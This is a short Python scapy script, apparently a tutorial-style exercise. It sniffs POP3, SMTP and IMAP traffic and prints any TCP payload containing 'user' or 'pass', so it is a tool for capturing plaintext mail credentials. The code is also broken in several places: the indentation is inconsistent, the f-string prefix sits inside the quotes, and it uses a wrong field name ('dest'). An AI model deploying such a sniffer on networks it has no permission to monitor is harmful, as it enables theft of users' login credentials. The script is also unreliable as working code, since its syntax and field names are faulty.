from scapy.all import sniff, TCP, IP

def packet_callback(packet):

	if packet['TCP'].payload:
		mypacket = str(packet['TCP'].payload)
	    if 'user' in mypacket or 'pass' in mypacket:
		  print('f[*] Destination: {packet[IP].dest}')
		  print('f[*] payload: {mypacket}')

def main():
	sniff(filter='tcp port 110 or tcp port 25 or tcp port 143', prn=packet_callback, store=0)
if __name__ == '__main__':
	main()